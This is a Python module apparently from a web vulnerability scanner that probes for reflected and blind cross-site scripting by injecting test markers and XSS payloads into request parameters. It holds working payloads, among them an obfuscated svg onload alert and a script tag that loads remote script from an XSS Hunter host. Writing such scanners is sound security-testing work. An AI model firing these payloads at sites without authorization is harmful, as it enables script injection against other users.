
from core.scanner.module import *


class XSS(ParamsScanner):

    def __init__(self, config, info = {
        "Authors": ["Abdallah Mohamed"],
        "Name": "Cross Site Script",
        "Description": 'The product does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users. ',
        "Risk": Risk.Critical,
        "Referances": [
            "https://owasp.org/www-community/attacks/xss/"
        ]
    }) -> None:
        ParamsScanner.__init__(self, config, info)

        self.xsshunter    = self.options.get('xsshunter')
        self.collaborator = self.options.get('collaborator')

    def check(self):
        # If xsshunter or collaborator were used, we have to attack all params
        # To detect blind cases 

        if self.xsshunter or self.collaborator:
            # Include all parameters even those that don't reflect in the same page
            self.InsertAllParamsToScan()

            # We have to not resume
            return True


        endpoint = self.DeepCloneEndpoint()
        params = endpoint.GetAllParams()
        counter = 0

        for p in params:
            params[p] = f"Hello{str(counter)}"
            counter += 1

        endpoint.SetParams(params)

        try:
            req = self.GetRequester( endpoint )
            res = req.Send()
        except:
            return False

        ret = False

        for i in range(len(params)):
            value = f"Hello{str(i)}"
            if value in res.text:
                # Get key by value 
                vulnerable_param = list(params.keys())[list(params.values()).index(value)]
                self.InsertParamToScan(vulnerable_param)
                ret = True

        return ret
        
    def GetPayloads(self):

        payloads = [
            '"><svg onload=alert&#0000000040`XSSB00M`)>'
        ]

        if self.xsshunter:
            payloads.append(f"\"><sCRiPt src={self.xsshunter}></ScrIpT>")

        if self.collaborator:
            host = urlparse(self.collaborator).netloc
            payloads.append(f"<ImG sRc=\"http://{host}\">")

        return payloads

    def is_vulnerable(self, res) -> bool:
        for payload in self.GetPayloads():
            if payload in res.text and self._is_valid_xss_response(res):
                return True

        return False

    def _is_valid_xss_response(self,response):
        return 'text' in response.headers.get('Content-Type')
